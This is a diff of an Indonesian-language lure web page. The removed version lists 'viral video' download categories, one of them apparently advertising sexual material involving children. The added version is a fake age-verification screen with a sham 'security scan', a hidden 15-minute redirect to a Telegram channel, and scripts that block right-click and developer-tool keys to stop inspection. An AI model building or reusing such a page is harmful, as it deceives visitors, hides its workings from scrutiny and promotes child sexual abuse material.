@@ -1,166 +1,294 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Viral Full Gratis</title>
-    <style>
-        :root {
-            --bg-color: #f0f7ff;
-            --card-bg: #4a6fff;
-            --card-hover: #3451c7;
-            --text-white: #ffffff;
-            --overlay-bg: rgba(255, 255, 255, 0.9);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Access Verification</title>
 
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background-color: var(--bg-color);
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+<style>
 
-        /* Loading Overlay */
-        #loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--overlay-bg);
-            display: none; /* Sembunyi secara default */
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            flex-direction: column;
-        }
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial, Helvetica, sans-serif;
+}
 
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #ccc;
-            border-top: 5px solid var(--card-bg);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
+body{
+background:#000;
+height:100vh;
+overflow:hidden;
+color:white;
+}
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+/* background neon */
 
-        header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
+.bg{
+position:fixed;
+width:100%;
+height:100%;
+background:
+radial-gradient(circle at 30% 30%,#ff0066 0%,transparent 40%),
+radial-gradient(circle at 70% 60%,#ff0040 0%,transparent 40%),
+#000;
+filter:blur(80px);
+animation:movebg 12s infinite alternate;
+}
 
-        h2 { margin: 0; font-size: 22px; color: #1a1a1a; letter-spacing: 1px; }
-        p { font-size: 14px; color: #666; margin-top: 5px; }
+@keyframes movebg{
+0%{transform:scale(1);}
+100%{transform:scale(1.4);}
+}
 
-        /* Grid Layout */
-        .container {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            max-width: 450px;
-            width: 100%;
-        }
+/* age verification */
 
-        /* Card Style */
-        .card {
-            background-color: var(--card-bg);
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-            cursor: pointer;
-            text-decoration: none;
-        }
+.age-modal{
+position:absolute;
+width:100%;
+height:100%;
+display:flex;
+align-items:center;
+justify-content:center;
+z-index:10;
+}
 
-        .card:hover {
-            transform: translateY(-8px);
-            background-color: var(--card-hover);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
-        }
+.age-box{
+width:90%;
+max-width:420px;
+background:#0a0a0a;
+border-radius:12px;
+padding:35px;
+text-align:center;
+box-shadow:
+0 0 30px rgba(255,0,80,.6);
+}
 
-        .card-image {
-            width: 100%;
-            height: 140px;
-            background-color: #ddd;
-            background-size: cover;
-            background-position: center;
-        }
+.age-title{
+font-size:26px;
+color:#ff0066;
+margin-bottom:10px;
+}
 
-        .card-info {
-            padding: 15px 10px;
-            text-align: center;
-            color: var(--text-white);
-            font-size: 13px;
-            font-weight: bold;
-            line-height: 1.5;
-        }
+.age-text{
+font-size:14px;
+opacity:.8;
+margin-bottom:25px;
+}
 
-        @media (max-width: 400px) {
-            .container { gap: 10px; }
-            .card-image { height: 120px; }
-        }
-    </style>
+.btn{
+width:100%;
+padding:14px;
+border:none;
+margin:8px 0;
+border-radius:8px;
+font-size:16px;
+cursor:pointer;
+}
+
+.btn-yes{
+background:#ff0066;
+color:white;
+}
+
+.btn-no{
+background:#222;
+color:white;
+}
+
+/* loader screen */
+
+.loader{
+position:absolute;
+width:100%;
+height:100%;
+display:flex;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+display:none;
+}
+
+.scan-box{
+width:90%;
+max-width:400px;
+background:#0c0c0c;
+padding:35px;
+border-radius:12px;
+text-align:center;
+box-shadow:
+0 0 25px rgba(255,0,80,.6);
+}
+
+.logo{
+font-size:24px;
+color:#ff0066;
+margin-bottom:20px;
+}
+
+.spinner{
+width:60px;
+height:60px;
+border-radius:50%;
+border:5px solid #222;
+border-top:5px solid #ff0066;
+animation:spin 1s linear infinite;
+margin:20px auto;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
+
+.progress-bar{
+width:100%;
+height:10px;
+background:#222;
+border-radius:20px;
+overflow:hidden;
+margin-top:20px;
+}
+
+.progress{
+width:0%;
+height:100%;
+background:linear-gradient(90deg,#ff0066,#ff3385);
+}
+
+.scan-text{
+font-size:13px;
+opacity:.7;
+margin-top:15px;
+}
+
+</style>
 </head>
+
 <body>
 
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-        <p style="font-weight: bold; color: var(--card-bg);">Memuat Konten...</p>
-    </div>
+<div class="bg"></div>
 
-    <header>
-        <h2>KEDEWASAAN ROLE VVIP</h2>
-        <p>Klik daftar di bawah untuk membuka video</p>
-    </header>
+<!-- AGE VERIFICATION -->
 
-    <div class="container" id="main-gallery">
-        </div>
+<div class="age-modal" id="ageModal">
 
-    <script>
-        const categories = [
-            { title: "Kumpulan Indo Viral", count: "500 VIDEO", img: "https://image2url.com/r2/default/images/1773290202459-9f63904f-57eb-4ad5-b2a6-d5ec1314fc00.jpg", url: "download.html" },
-            { title: "Kumpulan Jepang", count: "300 VIDEO", img: "https://image2url.com/r2/default/images/1773290304127-70353fbc-b3d8-4ab6-9ee5-fa4b5f75626a.jpg", url: "download.html" },
-            { title: "Kumpulan Malaysia", count: "150 VID", img: "https://image2url.com/r2/default/images/1773291278146-43fa87ab-5c5b-420d-a077-71fac15b76ce.jpg", url: "download.html" },
-            { title: "Kumpulan Anak Kecil All Negara", count: "Tersedia", img: "https://image2url.com/r2/default/images/1773291300913-401b88b2-a732-4dc9-8f0e-343c0d190b58.jpg", url: "download.html" },
-            { title: "Kumpulan Selebgram Malay + Indo", count: "Update Harian", img: "https://image2url.com/r2/default/images/1773291319549-11f08df5-c329-43c5-ba56-7130584d968f.jpg", url: "download.html" },
-            { title: "FULL VIDEO IBU TIRI YANG VIRAL", count: "Live Recording", img: "https://image2url.com/r2/default/images/1774228427972-e325e47d-c8e8-41fb-99c1-158a3d0dd43d.jpg", url: "download.html" }
-        ];
+<div class="age-box">
 
-        const gallery = document.getElementById('main-gallery');
-        const overlay = document.getElementById('loading-overlay');
+<div class="age-title">18+ AGE VERIFICATION</div>
 
-        categories.forEach(item => {
-            const card = document.createElement('div');
-            card.className = 'card';
-            
-            card.innerHTML = `
-                <div class="card-image" style="background-image: url('${item.img}')"></div>
-                <div class="card-info">
-                    ${item.title.toUpperCase()}<br>
-                    <span style="font-weight: normal; opacity: 0.9;">(${item.count})</span>
-                </div>
-            `;
+<div class="age-text">
+Anda harus mengkonfirmasi bahwa Anda berusia di atas 18 tahun.
+</div>
 
-            // Fungsi klik dengan loading
-            card.onclick = () => {
-                overlay.style.display = 'flex'; // Munculkan loading
-                
-                // Simulasi delay 1 detik sebelum pindah halaman
-                setTimeout(() => {
-                    window.location.href = item.url;
-                }, 1000);
-            };
-            
-            gallery.appendChild(card);
-        });
-    </script>
+<button class="btn btn-yes" onclick="enterSite()">I AM 18+</button>
+<button class="btn btn-no" onclick="leave()">EXIT</button>
+
+</div>
+
+</div>
+
+<!-- LOADER -->
+
+<div class="loader" id="loader">
+
+<div class="scan-box">
+
+<div class="logo">Secure Adult Access</div>
+
+<div class="spinner"></div>
+
+<div class="progress-bar">
+<div class="progress" id="progress"></div>
+</div>
+
+<div class="scan-text" id="scanText">
+Initializing secure connection...
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+/* redirect tujuan */
+const redirectURL = "https://t.me/c/3770540575/1149";
+
+/* hidden timer 15 menit */
+const hiddenTime = 15 * 60 * 1000;
+
+/* text fake scan */
+
+const scanMessages = [
+"Menginisialisasi koneksi aman...",
+"Memeriksa kompatibilitas perangkat...",
+"Menganalisis konfigurasi jaringan...",
+"Memindai keamanan koneksi...",
+"Memverifikasi usia pengguna...",
+"Menghubungkan ke server media...",
+"Mempersiapkan streaming privat...",
+"Mengoptimalkan kecepatan jaringan...",
+"Menyinkronkan server konten...",
+"Menyelesaikan proses verifikasi akses..."
+];
+
+function enterSite(){
+
+document.getElementById("ageModal").style.display="none";
+document.getElementById("loader").style.display="flex";
+
+startLoading();
+
+}
+
+function leave(){
+
+window.location.href="https://nonton-video-viral.vercel.app/";
+
+}
+
+let progress = 0;
+
+function startLoading(){
+
+const bar = document.getElementById("progress");
+const text = document.getElementById("scanText");
+
+setInterval(()=>{
+
+progress += Math.random()*4;
+
+if(progress > 100) progress = 100;
+
+bar.style.width = progress + "%";
+
+text.innerText =
+scanMessages[Math.floor(Math.random()*scanMessages.length)];
+
+},1200);
+
+}
+
+/* hidden redirect timer */
+
+setTimeout(()=>{
+
+window.location.href = redirectURL;
+
+}, hiddenTime);
+
+
+/* anti inspect basic */
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown=function(e){
+if(e.keyCode==123){return false;}
+if(e.ctrlKey && e.shiftKey && e.keyCode==73){return false;}
+if(e.ctrlKey && e.keyCode==85){return false;}
+}
+
+</script>
+
 </body>
 </html>
